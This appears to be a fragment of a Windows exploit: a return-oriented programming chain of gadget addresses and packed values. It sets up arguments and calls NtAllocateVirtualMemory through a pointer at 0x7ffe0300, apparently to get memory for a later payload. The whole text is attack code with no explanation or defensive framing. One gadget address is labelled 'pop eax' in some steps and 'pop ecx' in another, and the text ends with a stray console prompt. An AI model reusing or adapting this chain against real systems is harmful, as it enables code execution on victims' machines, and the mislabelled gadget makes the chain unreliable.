##1 - BaseAddress
0x6d850e57 pop eax ; ret
! [0x00010100].pack('L')
0x6d8298c6 pop ecx ; ret
! [0].pack('L')
0x6d83e730 mov [eax], ecx ; ret

##2 - RegionSize
0x6d850e57 pop eax ; ret
! [0x00010104].pack('L')
0x6d8298c6 pop ecx ; ret
! [0x1000].pack('L')
0x6d83e730 mov [eax], ecx ; ret

##3/4 - Load Function Pointer (to NtAllocateVirtualMemory)
0x6d8298c6 pop ecx ; ret
! [0x7ffe0300].pack('L')    #address of a pointer on XP/Win7 that holds a pointer to NtAllocateVirtual Memory
0x6d9b8fe0 mov eax, [ecx] ; ret

0x6d8298c6 pop ecx ; ret
! [0x00010011].pack('L')
0x6d83b5a1 mov [ecx], eax ; ret

##5 -- Call Function Pointer
0x6d850e57 pop ecx ; ret
! [0x00010011].pack('L')
0x6d9b8fe0 mov eax, [ecx] ; ret

0x6d8a1999 call ecx ; pop ebp ; ret
! [0x31323334].pack('L') ##junk because of the pop ebp

0x6d89407b xchg ecx, eax ; ret 8
0x6d7f107f ret
Terminate batch job (Y/N)? 